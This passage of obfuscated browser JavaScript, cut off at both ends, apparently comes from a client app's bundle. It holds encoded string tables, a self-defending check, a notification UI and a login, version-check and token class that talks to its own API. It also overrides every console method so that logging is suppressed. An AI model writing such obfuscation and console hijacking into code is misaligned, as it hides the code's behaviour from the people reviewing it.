      "cIaGicaGicaGCa",
      "cIaGicaGicaGyG",
      "mtu1oduWmuLkrNDAva",
      "mZe5nZa4mfPXuuvuvW",
      "EKDgt3K",
      "BNnMB3jToIb0CG",
      "yxbWzw5Kq2HPBa",
      "zgL2",
      "cIaGicaGicaGDa",
      "ideWmcu7cIaGia",
      "EtOGzMXLEdSkia",
      "AxrPB246ihDPza",
      "icaGicaGicaGDa",
      "lxnLCMLMoWOGia",
      "CMDIysGWlcaWla",
      "ywXPz24TAxrLBq",
      "zfrXuNq",
      "icaGicaGicaGia",
      "zMLYC3rdAgLSza",
      "icaGicaGzMXLEa",
      "EdSkicaGicaGia",
      "zvj2s3e",
      "CgfJAxr5oIaWoW",
      "pc9ZCgfUpGOGia",
      "D2fYBMLUzW",
      "icaGicaGicbMBW",
      "ogLjAffIwG",
      "DgfIBgu",
      "lxnPEMu6ideUmq",
      "cIaGicaGicaGBW",
      "y3jLyxrLrwXLBq",
      "ztSkicaGicaGia",
    ];
    return (Ig = function () {
      return t;
    })();
  }
  axiomVamp;
  const Sg = Eg;
  !(function (t) {
    const e = 364,
      n = 387,
      r = 379,
      o = 390,
      i = 414,
      s = 365,
      a = Eg,
      u = t();
    for (; []; )
      try {
        if (
          395760 ===
          -parseInt(a(357)) / 1 +
            (parseInt(a(312)) / 2) * (-parseInt(a(e)) / 3) +
            -parseInt(a(n)) / 4 +
            -parseInt(a(391)) / 5 +
            parseInt(a(r)) / 6 +
            (-parseInt(a(o)) / 7) * (-parseInt(a(i)) / 8) +
            parseInt(a(s)) / 9
        )
          break;
        u.push(u.shift());
      } catch (c) {
        u.push(u.shift());
      }
  })(Ig);
  const _g = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    Tg = _g(void 0, function () {
      const t = 368,
        e = 355,
        n = Eg;
      return Tg.toString()
        [n(368)]("(((.+)+)+)+$")
        .toString()
        .constructor(Tg)
        [n(t)](n(e) + "+$");
    });
  Tg();
  const Bg = (function () {
      let t = !![];
      return function (e, n) {
        const r = 384,
          o = t
            ? function () {
                if (n) {
                  const t = n[Eg(r)](e, arguments);
                  return (n = null), t;
                }
              }
            : function () {};
        return (t = ![]), o;
      };
    })(),
    Cg = Bg(void 0, function () {
      const t = 323,
        e = 359,
        n = 415,
        r = 409,
        o = 376,
        i = 404,
        s = 326,
        a = 370,
        u = 314,
        c = Eg,
        l = {
          TeVcu: function (t, e) {
            return t(e);
          },
          EcUcc: function (t, e) {
            return t + e;
          },
          eRvKq: c(353) + "nction() ",
          dTqRt: c(t),
          UFIdR: "warn",
          KDvAq: "info",
          CRzOY: c(e),
          sWRpR: c(n),
          WNbpt: function (t, e) {
            return t < e;
          },
        };
      let d;
      try {
        d = l.TeVcu(
          Function,
          l[c(381)](l[c(r)], '{}.constructor("retu' + c(o) + " )") + ");"
        )();
      } catch (p) {
        d = window;
      }
      const f = (d.console = d.console || {}),
        h = [l[c(i)], l.UFIdR, l.KDvAq, l[c(s)], c(a), l.sWRpR, "trace"];
      for (let m = 0; l.WNbpt(m, h.length); m++) {
        const t = Bg.constructor[c(u)].bind(Bg),
          e = h[m],
          n = f[e] || t;
        (t.__proto__ = Bg.bind(Bg)),
          (t.toString = n[c(322)].bind(n)),
          (f[e] = t);
      }
    });
  function Eg(t, e) {
    const n = Ig();
    return (
      (Eg = function (e, r) {
        let o = n[(e -= 308)];
        if (void 0 === Eg.dLDQQZ) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (Eg.ktxZMv = i), (t = arguments), (Eg.dLDQQZ = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.alcGOb = t),
              (this.SNPVXm = [1, 0, 0]),
              (this.bSdUUO = function () {
                return "newState";
              }),
              (this.AkBkkO = "\\w+ *\\(\\) *{\\w+ *"),
              (this.kTGpOu = "['|\"].+['|\"];? *}");
          };
          (e.prototype.gVLcxE = function () {
            const t = new RegExp(this.AkBkkO + this.kTGpOu).test(
              this.bSdUUO.toString()
            )
              ? --this.SNPVXm[1]
              : --this.SNPVXm[0];
            return this.EEsNcs(t);
          }),
            (e.prototype.EEsNcs = function (t) {
              return Boolean(~t) ? this.OAPHDF(this.alcGOb) : t;
            }),
            (e.prototype.OAPHDF = function (t) {
              for (let e = 0, n = this.SNPVXm.length; e < n; e++)
                this.SNPVXm.push(Math.round(Math.random())),
                  (n = this.SNPVXm.length);
              return t(this.SNPVXm[0]);
            }),
            new e(Eg).gVLcxE(),
            (o = Eg.ktxZMv(o)),
            (t[s] = o);
        }
        return o;
      }),
      Eg(t, e)
    );
  }
  Cg(),
    (window[Sg(320)] = function (t) {
      return function () {
        return t;
      };
    });
  const xg = (t, e) => {
    const n = 350,
      r = 392,
      o = 328,
      i = 317,
      s = 342,
      a = 408,
      u = 356,
      c = 407,
      l = 321,
      d = 405,
      f = 372,
      h = 340,
      p = 308,
      m = 389,
      g = 316,
      y = 412,
      w = 333,
      b = 310,
      v = 380,
      A = 413,
      k = 362,
      I = 401,
      S = 344,
      _ = 417,
      T = 410,
      B = 345,
      C = 343,
      E = 346,
      x = 419,
      P = 319,
      O = 382,
      R = 418,
      M = 350,
      L = 366,
      N = 327,
      D = 383,
      U = 334,
      q = 358,
      z = 309,
      K = 331,
      W = 330,
      F = 316,
      j = 339,
      G = 351,
      V = 399,
      H = 371,
      Z = 352,
      X = 329,
      J = 398,
      Y = 420,
      Q = 338,
      $ = 411,
      tt = 385,
      et = 335,
      nt = 311,
      rt = 377,
      ot = 363,
      it = 347,
      st = 406,
      at = 400,
      ut = 374,
      ct = 393,
      lt = 313,
      dt = 410,
      ft = 341,
      ht = 350,
      pt = Sg,
      mt = {
        zGFOy: "notification-container",
        bnEYC: pt(395),
        MnhkY: function (t, e) {
          return t === e;
        },
        JBgBr: "#4CAF50",
        hGIxd: pt(n),
        hqEqq: function (t, e, n) {
          return t(e, n);
        },
      };
    let gt = document.getElementById(mt[pt(r)]);
    !gt &&
      ((gt = document.createElement("div")),
      (gt.id = pt(o) + "on-container"),
      (gt[pt(350)].cssText =
        pt(i) +
        pt(s) +
        "n: fixed;\n            top: 20p" +
        pt(a) +
        pt(u) +
        " 50%;\n            transform: translateX(-50%);\n            z" +
        pt(369) +
        pt(375) +
        "         d" +
        pt(318) +
        "ex;\n      " +
        pt(c) +
        pt(l) +
        ": column-reverse;\n  " +
        pt(d) +
        pt(403) +
        "s: center;\n            gap: 15px;\n            width: 100%;\n            max-width: 450px;\n           " +
        pt(f) +
        pt(h) +
        "e;\n        "),
      document.body.appendChild(gt));
    const yt = document.createElement(mt[pt(p)]);
    yt.style[pt(309)] =
      pt(m) +
      pt(g) +
      " " +
      (mt.MnhkY(e, pt(361)) ? mt.JBgBr : e === pt(y) ? "#FF9800" : "#F44336") +
      (pt(324) + pt(w) + pt(b)) +
      "  padding: 20px 25px;\n        " +
      pt(v) +
      "ius: 6px;\n" +
      pt(A) +
      pt(348) +
      " 'Segoe UI" +
      pt(k) +
      " 'Helvetica Neue', Arial, sans" +
      pt(I) +
      "      width: 100%;\n        box" +
      pt(S) +
      " 4px 20px " +
      pt(402) +
      " 0, 0.15);" +
      pt(_) +
      pt(T) +
      pt(396) +
      "ransform: translateY" +
      pt(B) +
      pt(C) +
      "mation: fa" +
      pt(E) +
      "ease-out forwards;\n        overflow: hidden;\n        position: relativ" +
      pt(x) +
      " pointer-e" +
      pt(P) +
      "o;\n        box-sizin" +
      pt(O) +
      "box;\n    ";
    const wt = document[pt(R) + "ent"](mt.bnEYC);
    wt[pt(M)].cssText =
      pt(388) +
      pt(L) +
      pt(378) +
      "       bot" +
      pt(315) +
      pt(N) +
      ": 0;\n        height: 4px;\n        width:" +
      pt(397) +
      pt(D) +
      "round: rgba(0, 0, 0," +
      pt(U) +
      " ";
    const bt = document["createElem" + pt(q)]("div");
    bt.style[pt(z)] =
      pt(K) +
      "eight: 100" +
      pt(354) +
      pt(W) +
      "\n        b" +
      pt(F) +
      " rgba(255," +
      pt(j) +
      pt(G) +
      "     trans" +
      pt(V) +
      pt(H) +
      pt(Z);
    const vt = { success: "", warning: "", error: "" },
      At = vt,
      kt = {};
    (kt[pt(361)] = "Success"), (kt.warning = "Warning"), (kt.error = "Error");
    const It = kt;
    (yt.innerHTML =
      pt(367) +
      pt(332) +
      pt(X) +
      "    displa" +
      pt(J) +
      "           align-items: center;\n        " +
      pt(Y) +
      "-bottom: 8px;\n            font-weight: 6" +
      pt(360) +
      "      font" +
      pt(416) +
      pt(386) +
      '  ">\n     ' +
      pt(349) +
      'an style="margin-right: 10px; font-size:' +
      pt(Q) +
      At[e] +
      "</span>\n            <span>" +
      It[e] +
      pt($) +
      "      </di" +
      pt(325) +
      " <div styl" +
      pt(tt) +
      "      margin-bottom:" +
      pt(et) +
      pt(nt) +
      "ine-height: 1.5;\n            f" +
      pt(rt) +
      pt(ot) +
      '     ">' +
      t +
      "</div>\n    "),
      wt.appendChild(bt),
      yt.appendChild(wt),
      gt[pt(it) + "re"](yt, gt[pt(st)]);
    const St = "notificati" + pt(336) + "on-styles";
    let _t = document.getElementById(St);
    !_t &&
      ((_t = document["createElem" + pt(358)](mt.hGIxd)),
      (_t.id = St),
      (_t.textContent =
        "\n            @keyframes fadeIn {\n       " +
        pt(at) +
        "o { \n                    opaci" +
        pt(ut) +
        "                 tra" +
        pt(ct) +
        pt(lt) +
        ");\n                }" +
        pt(i) +
        "   }\n            @keyframes fadeOut {\n                to { o" +
        pt(dt) +
        " }\n            }\n        "),
      document[pt(ft)][pt(394) + "d"](_t)),
      mt.hqEqq(
        setTimeout,
        () => {
          const t = pt;
          bt[t(ht)][t(373)] = "100%";
        },
        10
      ),
      setTimeout(() => {
        const t = 337,
          e = 337;
        (yt.style.opacity = "0"),
          setTimeout(() => {
            const n = Eg;
            yt[n(t)](), gt && 0 === gt.children.length && gt[n(e)]();
          }, 300);
      }, 3e3);
  };
  axiomVamp;
  const Pg = Og;
  function Og(t, e) {
    const n = Rg();
    return (
      (Og = function (e, r) {
        let o = n[(e -= 236)];
        if (void 0 === Og.JffRfK) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (Og.sgUTCh = i), (t = arguments), (Og.JffRfK = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.nntnrS = t),
              (this.XbdfJs = [1, 0, 0]),
              (this.rSbYxg = function () {
                return "newState";
              }),
              (this.wrNltx = "\\w+ *\\(\\) *{\\w+ *"),
              (this.HOQjKn = "['|\"].+['|\"];? *}");
          };
          (e.prototype.dXPrTl = function () {
            const t = new RegExp(this.wrNltx + this.HOQjKn).test(
              this.rSbYxg.toString()
            )
              ? --this.XbdfJs[1]
              : --this.XbdfJs[0];
            return this.isOCDS(t);
          }),
            (e.prototype.isOCDS = function (t) {
              return Boolean(~t) ? this.uodQeJ(this.nntnrS) : t;
            }),
            (e.prototype.uodQeJ = function (t) {
              for (let e = 0, n = this.XbdfJs.length; e < n; e++)
                this.XbdfJs.push(Math.round(Math.random())),
                  (n = this.XbdfJs.length);
              return t(this.XbdfJs[0]);
            }),
            new e(Og).dXPrTl(),
            (o = Og.sgUTCh(o)),
            (t[s] = o);
        }
        return o;
      }),
      Og(t, e)
    );
  }
  function Rg() {
    const t = [
      "D2fYBMLUzW",
      "Aw5MBW",
      "wK1lrgu",
      "C2vHCMnO",
      "qMvHCMvYia",
      "tNjqCvu",
      "y29UC3rYDwn0BW",
      "CfHpCeG",
      "sLPouNy",
      "C3rYAw5NAwz5",
      "z2v0q29UBMvJDa",
      "suXZuLy",
      "yxbWBgLJyxrPBW",
      "mtGYnZe5nK91zwfUtq",
      "mJG1ndK4yND3r0Df",
      "C3rHDhvZ",
      "B2jQzwn0",
      "Ce9nuui",
      "BwvZC2fNzq",
      "qNr0r04",
      "mtu4nJa3EKfOvufc",
      "uxP4wxC",
      "BLblvg8",
      "uNbJ",
      "D2Lxte4",
      "z2v0vg9Rzw4",
      "Bunfuwu",
      "r0vu",
      "vKPeBvu",
      "C3rYAw5N",
      "nenlAgjdBq",
      "Duv0vuS",
      "BMn0Aw9UkcKG",
      "y2HLy2TiD2LK",
      "zLHXDhe",
      "vuvTDKS",
      "AxndB25Uzwn0zq",
      "zxjYB3i",
      "BI9QC29U",
      "D2TxB1m",
      "DhjHy2u",
      "r29xtLa",
      "rMXiCha",
      "yMLUza",
      "y2XLyxjuB2TLBG",
      "ru5Ay0q",
      "EKfkv2m",
      "ANnVBG",
      "yxbWBhK",
      "BgvUz3rO",
      "Ag9PCK8",
      "CvHIBKK",
      "Dg9tDhjPBMC",
      "q0PoA3e",
      "sgfKDxm",
      "t2Xlq1K",
      "mtGWu0fwruPz",
      "twTTyxC",
      "vKfTBfO",
      "y2fSBfjWyW",
      "tgvhBMu",
      "tNrIsvC",
      "C3vJy2vZCW",
      "twHKBum",
      "u0fhv2q",
      "q0TQEwq",
      "zgLZy29UBMvJDa",
      "ndC4nJu2ofjgugLYAa",
      "z2v0u0rl",
      "EeHnwLG",
      "rhPNDMK",
      "y2fSBa",
      "C2TdCNLWDa",
      "z2v0sw5ZDgfUyW",
      "DxbrCei",
      "BMPPtfG",
      "D2Hrq0q",
      "rufmtKS",
      "qvbjx0jbu0u",
      "CeXWq08",
      "svfKy1m",
      "zfrxAva",
      "swjSt1C",
      "mJi4nde1CxfXC25P",
      "mMHSvg1xDa",
      "DK5pzKS",
      "r2HQCw8",
      "C2v0vg9Rzw4",
      "Aw9U",
      "nxPiA2X1zW",
      "y21wv2y",
      "odq0odu0ALLYqxvx",
      "CM4GDgHPCYiPka",
      "vfj0t2m",
      "y3vYCMvUDfrVAW",
      "uLDcseq",
      "Bwv0Ag9K",
      "wNHxt0S",
      "zgvJB2rL",
      "zgf0yq",
      "EMnyr0y",
      "CM9Y",
      "vLrRyMO",
      "Cu9Nv20",
      "nde0mdGYyKnTtfHt",
      "qvbjx1bvqL9lrq",
      "twXAEvi",
    ];
    return (Rg = function () {
      return t;
    })();
  }
  (function (t) {
    const e = 334,
      n = 302,
      r = 304,
      o = 333,
      i = 269,
      s = Og,
      a = t();
    for (; []; )
      try {
        if (
          327595 ===
          (parseInt(s(317)) / 1) * (parseInt(s(297)) / 2) +
            (parseInt(s(e)) / 3) * (parseInt(s(243)) / 4) +
            (parseInt(s(n)) / 5) * (-parseInt(s(r)) / 6) +
            parseInt(s(o)) / 7 +
            -parseInt(s(280)) / 8 +
            (-parseInt(s(340)) / 9) * (-parseInt(s(i)) / 10) +
            -parseInt(s(296)) / 11
        )
          break;
        a.push(a.shift());
      } catch (u) {
        a.push(a.shift());
      }
  })(Rg),
    (window[Pg(285)] = function (t) {
      return function () {
        return t;
      };
    });
  const Mg = class {
    static [Pg(300)](t) {
      this.currentToken = t;
    }
    static [Pg(257)]() {
      this.currentToken = null;
    }
    static [Pg(238)]() {
      return this.currentToken;
    }
    static hasToken() {
      return null !== this[Pg(307) + "en"];
    }
    static async login(t, e) {
      const n = 306,
        r = 291,
        o = 335,
        i = 250,
        s = 260,
        a = 313,
        u = 314,
        c = 241,
        l = 322,
        d = 262,
        f = 288,
        h = 276,
        p = 252,
        m = 341,
        g = 308,
        y = 262,
        w = 328,
        b = 266,
        v = Pg,
        A = {
          MlZyR: function (t, e) {
            return t < e;
          },
          BttGN: function (t, e) {
            return t >>> e;
          },
          UUXpC: function (t, e) {
            return t % e;
          },
          CJNkq: function (t, e) {
            return t * e;
          },
          XWNGV: function (t, e) {
            return t >>> e;
          },
          cmVWf: function (t, e) {
            return t & e;
          },
          zJvnr: function (t, e) {
            return t >>> e;
          },
          bxnmZ: function (t, e) {
            return t & e;
          },
          njiLX: function (t, e) {
            return t * e;
          },
          wiWLN: function (t, e) {
            return t ^ e;
          },
          TRtOc: function (t, e) {
            return t + e;
          },
          hbOov: function (t, e) {
            return t + e;
          },
          Hadus: function (t, e, n) {
            return t(e, n);
          },
          zcXGF: function (t, e) {
            return t(e);
          },
          VJDmU: function (t, e) {
            return t === e;
          },
          DOwRH: "string",
          GratX: function (t, e) {
            return t === e;
          },
          ZMKDe: function (t, e) {
            return t + e;
          },
          sAzZN: "error",
        };
      try {
        const u = A[v(n)](
            A.hbOov(
              A.TRtOc(
                this[v(r)],
                (function () {
                  const t = 339,
                    e = 319,
                    n = function (t, n) {
                      return A[Og(e)](t, n);
                    },
                    r = function (e, n) {
                      return A[Og(t)](e, n);
                    },
                    o = function (t, e) {
                      return t * e;
                    },
                    i = function (t, e) {
                      return A.UUXpC(t, e);
                    },
                    s = function (t, e) {
                      return t ^ e;
                    };
                  let a;
                  return function () {
                    if (!a) {
                      const t = new Uint8Array([
                          190, 156, 186, 187, 249, 210, 163, 160, 246, 148, 161,
                          240, 228, 142, 170, 189, 255, 156, 162, 170, 172,
                        ]),
                        e = -808452719,
                        u = new Uint8Array(t.length);
                      for (let a = 0; n(a, t.length); a++) {
                        const n = 255 & r(e, o(i(a, 4), 8));
                        u[a] = s(t[a], n);
                      }
                      a = new TextDecoder().decode(u);
                    }
                    return a;
                  };
                })()()
              ),
              t.username
            ) +
              (function () {
                const t = 262,
                  e = 262;
                let n;
                return function () {
                  const r = Og;
                  if (!n) {
                    const o = new Uint8Array([177, 149, 184, 166, 243, 192]),
                      i = -808452713,
                      s = new Uint8Array(o[r(t)]);
                    for (let t = 0; t < o[r(e)]; t++) {
                      const e = (i >>> A.CJNkq(t % 4, 8)) & 255;
                      s[t] = o[t] ^ e;
                    }
                    n = new TextDecoder().decode(s);
                  }
                  return n;
                };
              })()(),
            encodeURIComponent(e)
          ),
          c = { method: "POST" },
          l = await A[v(267)](fetch, u, c);
        if (!l.ok)
          return (
            C(),
            A.Hadus(
              xg,
              A.TRtOc(
                (function () {
                  let t;
                  return function () {
                    if (!t) {
                      const e = new Uint8Array([
                          221, 146, 168, 166, 255, 221, 169, 174, 248, 145, 170,
                          171, 177, 138, 166, 187, 249, 221, 188, 187, 240, 137,
                          186, 188, 171, 221,
                        ]),
                        n = -808452719,
                        r = new Uint8Array(e.length);
                      for (let t = 0; t < e.length; t++) {
                        const o = 255 & A.XWNGV(n, (t % 4) * 8);
                        r[t] = e[t] ^ o;
                      }
                      t = new TextDecoder().decode(r);
                    }
                    return t;
                  };
                })()(),
                l[v(o)]
              ),
              v(i)
            ),
            null
          );
        const d = await l[v(s)]();
        if (!d.data.success)
          return (
            xg(
              (function () {
                const t = 303,
                  e = {
                    JZNRv: function (e, n) {
                      return A[Og(t)](e, n);
                    },
                    vdYIB: function (t, e) {
                      return t >>> e;
                    },
                    ZYGXI: function (t, e) {
                      return A[Og(b)](t, e);
                    },
                  };
                let n;
                return function () {
                  const t = Og;
                  if (!n) {
                    const r = new Uint8Array([
                        223, 146, 168, 166, 253, 221, 169, 174, 250, 145, 170,
                        171,
                      ]),
                      o = -808452717,
                      i = new Uint8Array(r[t(262)]);
                    for (let n = 0; n < r[t(y)]; n++) {
                      const s = e[t(w)](e.vdYIB(o, e.ZYGXI(n % 4, 8)), 255);
                      i[n] = r[n] ^ s;
                    }
                    n = new TextDecoder().decode(i);
                  }
                  return n;
                };
              })()(),
              "error"
            ),
            null
          );
        if (!(await A[v(a)](Y, d)))
          return (
            C(),
            xg(
              (function () {
                const t = v,
                  e = {
                    mBTDR: function (t, e) {
                      return t & e;
                    },
                  };
                (e[t(p)] = function (t, e) {
                  return t >>> e;
                }),
                  (e.QzxYw = function (t, e) {
                    return t * e;
                  }),
                  (e.RWBHD = function (t, e) {
                    return t ^ e;
                  });
                const n = e;
                let r;
                return function () {
                  const e = t;
                  if (!r) {
                    const t = new Uint8Array([
                        221, 146, 168, 166, 255, 221, 166, 161, 229, 152, 168,
                        189, 248, 137, 182, 239, 242, 149, 170, 172, 250, 221,
                        169, 174, 248, 145, 170, 171, 176,
                      ]),
                      o = -808452719,
                      i = new Uint8Array(t.length);
                    for (let r = 0; r < t.length; r++) {
                      const s = n.mBTDR(n.wkWoS(o, n[e(m)](r % 4, 8)), 255);
                      i[r] = n[e(g)](t[r], s);
                    }
                    r = new TextDecoder().decode(i);
                  }
                  return r;
                };
              })()(),
              "error"
            ),
            null
          );
        if ((await J(d, this.API_PUB_KEY)) && d[v(312)].token) {
          const t = d[v(312)].token;
          return this.setToken(t), t;
        }
        return (
          xg(
            (function () {
              const t = {
                dTWiP: function (t, e) {
                  return A.zJvnr(t, e);
                },
                MhdmC: function (t, e) {
                  return t * e;
                },
                MVDmR: function (t, e) {
                  return A.UUXpC(t, e);
                },
              };
              let e;
              return function () {
                const n = Og;
                if (!e) {
                  const r = new Uint8Array([
                      211, 146, 168, 166, 241, 221, 185, 170, 237, 148, 169,
                      166, 252, 156, 187, 166, 240, 147, 239, 169, 254, 148,
                      163, 170, 251, 220,
                    ]),
                    o = -808452705,
                    i = new Uint8Array(r.length);
                  for (let e = 0; e < r[n(262)]; e++) {
                    const s = 255 & t[n(294)](o, t[n(h)](t.MVDmR(e, 4), 8));
                    i[e] = r[e] ^ s;
                  }
                  e = new TextDecoder().decode(i);
                }
                return e;
              };
            })()(),
            "error"
          ),
          C(),
          null
        );
      } catch (k) {
        let t = "Unknown er" + v(u);
        return (
          k instanceof Error
            ? (t = k.message)
            : A[v(c)](typeof k, A.DOwRH)
            ? (t = k)
            : k && A.GratX(typeof k, "object") && (t = JSON[v(329)](k)),
          xg(
            A[v(l)](
              (function () {
                let t;
                return function () {
                  const e = Og;
                  if (!t) {
                    const n = new Uint8Array([
                        221, 146, 168, 166, 255, 221, 169, 174, 248, 145, 170,
                        171, 177, 138, 166, 187, 249, 221, 170, 189, 227, 146,
                        189, 245, 177,
                      ]),
                      r = -808452719,
                      o = new Uint8Array(n.length);
                    for (let t = 0; t < n[e(d)]; t++) {
                      const i = A.bxnmZ(A.XWNGV(r, A[e(f)](t % 4, 8)), 255);
                      o[t] = A[e(237)](n[t], i);
                    }
                    t = new TextDecoder().decode(o);
                  }
                  return t;
                };
              })()(),
              t
            ),
            A.sAzZN
          ),
          null
        );
      }
    }
    static async getLatestVersion() {
      const t = 291,
        e = 254,
        n = 248,
        r = 274,
        o = 250,
        i = 312,
        s = 292,
        a = 336,
        u = 329,
        c = 244,
        l = 262,
        d = 247,
        f = 295,
        h = 255,
        p = 311,
        m = 262,
        g = 287,
        y = 311,
        w = Pg,
        b = {
          EAaxw: function (t, e) {
            return t >>> e;
          },
          grPqE: function (t, e) {
            return t * e;
          },
          fXqtq: function (t, e) {
            return t % e;
          },
          ILsRV: function (t, e, n) {
            return t(e, n);
          },
          GoWNP: "GET",
          UEmvK: function (t) {
            return t();
          },
          NtbIW: function (t, e) {
            return t + e;
          },
          pLpCO: "Unknown er" + w(314),
          MBoVB: function (t, e, n) {
            return t(e, n);
          },
          uEtUK: "error",
        };
      try {
        const s =
            this[w(t)] +
            (function () {
              const t = {
                  JfLES: function (t, e) {
                    return t < e;
                  },
                  upQpB: function (t, e) {
                    return t & e;
                  },
                },
                e = t;
              let n;
              return function () {
                const t = Og;
                if (!n) {
                  const r = new Uint8Array([
                      188, 154, 170, 187, 223, 156, 187, 170, 224, 137, 153,
                      170, 225, 142, 166, 160, 253,
                    ]),
                    o = -808452717,
                    i = new Uint8Array(r.length);
                  for (let n = 0; e.JfLES(n, r[t(m)]); n++) {
                    const s = e[t(g)](o >>> ((n % 4) * 8), 255);
                    i[n] = r[n] ^ s;
                  }
                  n = new TextDecoder()[t(y)](i);
                }
                return n;
              };
            })()(),
          a = await b[w(331)](fetch, s, { method: b[w(e)] });
        if (!a.ok)
          return (
            b[w(n)](C),
            xg(
              b[w(r)](
                (function () {
                  const t = w,
                    e = {
                      IblOW: function (t, e) {
                        return t < e;
                      },
                      FlHpp: function (t, e) {
                        return t & e;
                      },
                    };
                  e[t(342)] = function (t, e) {
                    return t * e;
                  };
                  const n = e;
                  let r;
                  return function () {
                    const e = t;
                    if (!r) {
                      const t = new Uint8Array([
                          195, 152, 190, 186, 244, 142, 187, 239, 247, 156, 166,
                          163, 244, 153, 239, 184, 248, 137, 167, 239, 226, 137,
                          174, 187, 228, 142, 245, 239,
                        ]),
                        o = -808452719,
                        i = new Uint8Array(t.length);
                      for (let r = 0; n[e(f)](r, t.length); r++) {
                        const s = n[e(h)](o >>> n.nPKTo(r % 4, 8), 255);
                        i[r] = t[r] ^ s;
                      }
                      r = new TextDecoder()[e(p)](i);
                    }
                    return r;
                  };
                })()(),
                a.status
              ),
              w(o)
            ),
            null
          );
        const u = await a.json();
        if (
          !u[w(i)].success ||
          u.data.version !==
            (function () {
              let t;
              return function () {
                if (!t) {
                  const e = new Uint8Array([165, 211, 252]),
                    n = -808452713,
                    r = new Uint8Array(e.length);
                  for (let t = 0; t < e.length; t++) {
                    const o = 255 & b.EAaxw(n, b.grPqE(t % 4, 8));
                    r[t] = e[t] ^ o;
                  }
                  t = new TextDecoder().decode(r);
                }
                return t;
              };
            })()()
        )
          return (
            xg(
              (function () {
                const t = function (t, e) {
                    return t < e;
                  },
                  e = function (t, e) {
                    return t * e;
                  },
                  n = function (t, e) {
                    return b[Og(d)](t, e);
                  };
                let r;
                return function () {
                  const o = Og;
                  if (!r) {
                    const i = new Uint8Array([
                        213, 146, 184, 161, 253, 146, 174, 171, 177, 137, 167,
                        170, 177, 145, 174, 187, 244, 142, 187, 239, 231, 152,
                        189, 188, 248, 146, 161,
                      ]),
                      s = -808452719,
                      a = new Uint8Array(i.length);
                    for (let r = 0; t(r, i[o(262)]); r++) {
                      const t = (s >>> e(n(r, 4), 8)) & 255;
                      a[r] = i[r] ^ t;
                    }
                    r = new TextDecoder()[o(311)](a);
                  }
                  return r;
                };
              })()(),
              "warning"
            ),
            null
          );
        return (await Y(u))
          ? !![]
          : (C(),
            b.ILsRV(
              xg,
              (function () {
                let t;
                return function () {
                  const e = Og;
                  if (!t) {
                    const n = new Uint8Array([
                        218, 147, 187, 170, 244, 143, 166, 187, 234, 221, 172,
                        167, 246, 158, 164, 239, 245, 156, 166, 163, 246, 153,
                        238,
                      ]),
                      r = -808452717,
                      o = new Uint8Array(n[e(l)]);
                    for (let t = 0; t < n[e(l)]; t++) {
                      const e = (r >>> ((t % 4) * 8)) & 255;
                      o[t] = n[t] ^ e;
                    }
                    t = new TextDecoder().decode(o);
                  }
                  return t;
                };
              })()(),
              "error"
            ),
            null);
      } catch (LA) {
        let e = b[w(s)];
        return (
          LA instanceof Error
            ? (e = LA.message)
            : "string" == typeof LA
            ? (e = LA)
            : LA && typeof LA === w(a) && (e = JSON[w(u)](LA)),
          b.MBoVB(
            xg,
            (function () {
              const t = 311;
              let e;
              return function () {
                const n = Og;
                if (!e) {
                  const r = new Uint8Array([
                      195, 152, 190, 186, 244, 142, 187, 239, 247, 156, 166,
                      163, 244, 153, 239, 184, 248, 137, 167, 239, 244, 143,
                      189, 160, 227, 199, 239,
                    ]),
                    o = -808452719,
                    i = new Uint8Array(r.length);
                  for (let t = 0; t < r.length; t++) {
                    const e = (o >>> ((t % 4) * 8)) & 255;
                    i[t] = r[t] ^ e;
                  }
                  e = new TextDecoder()[n(t)](i);
                }
                return e;
              };
            })()() + e,
            b[w(c)]
          ),
          null
        );
      }
    }
    static async [Pg(246)](t, e) {
      const n = 314,
        r = 327,
        o = 240,
        i = 283,
        s = 299,
        a = 260,
        u = 337,
        c = 318,
        l = 338,
        d = 262,
        f = 262,
        h = 311,
        p = 262,
        m = 273,
        g = 259,
        y = 239,
        w = Pg,
        b = {
          hoirO: function (t, e) {
            return t >>> e;
          },
          SAGWd: function (t, e) {
            return t * e;
          },
          qXbnI: function (t, e) {
            return t < e;
          },
          rjbvJ: function (t, e) {
            return t ^ e;
          },
          IOgXC: function (t, e) {
            return t * e;
          },
          qOgWm: function (t, e) {
            return t % e;
          },
          pXOpH: function (t, e) {
            return t + e;
          },
          Dzgvi: function (t, e, n) {
            return t(e, n);
          },
          Ghjqo: "error",
          UQBNE: function (t, e, n) {
            return t(e, n);
          },
          gaAOo: w(320),
          pOMQB: function (t, e) {
            return t(e);
          },
          juCxP: "Unknown er" + w(n),
          xHMZX: w(242),
          gEZKJ: function (t, e) {
            return t === e;
          },
          VAmlZ: "object",
        };
      try {
        const n =
            b.pXOpH(
              b[w(r)](
                this.API_BASE,
                (function () {
                  const t = 239,
                    e = w,
                    n = {};
                  (n[e(y)] = function (t, e) {
                    return t % e;
                  }),
                    (n.PmLeY = function (t, e) {
